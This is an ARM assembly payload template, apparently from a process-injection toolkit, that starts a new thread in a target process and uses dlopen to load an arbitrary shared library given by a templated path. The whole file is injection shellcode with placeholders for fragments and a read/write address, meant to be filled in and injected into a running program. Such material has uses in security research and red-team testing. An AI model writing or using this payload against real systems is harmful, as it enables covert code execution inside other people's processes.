# Threaded version of dlinject.s
# Same caveats as dlinject_threaded.s


b dlinject_threaded_main
// import reusable code fragments
[FRAGMENT:asminject_libdl_dlopen.s:FRAGMENT]
[FRAGMENT:asminject_libpthread_pthread_create.s:FRAGMENT]

load_dlinject_wrapper_address:
	mov r2, pc
	b call_pthread_create

dlinject_main:	
	mov r0, pc
	b call_dlopen

library_path:
	.ascii "[VARIABLE:librarypath:VARIABLE]\0"
	.balign 4

call_dlopen:
	push {r1}
	mov r1, #0x2@				@ mode (RTLD_NOW)
	bl asminject_libdl_dlopen
	pop {r1}

call_pthread_create:
	bl asminject_libpthread_pthread_create

SHELLCODE_SECTION_DELIMITER

dlinject_threaded_main:
// load the arbitrary read/write address into r0
	ldr r0, [pc]
	b load_dlinject_wrapper_address

read_write_address:
	.word [VARIABLE:READ_WRITE_ADDRESS:VARIABLE]
	.balign 4

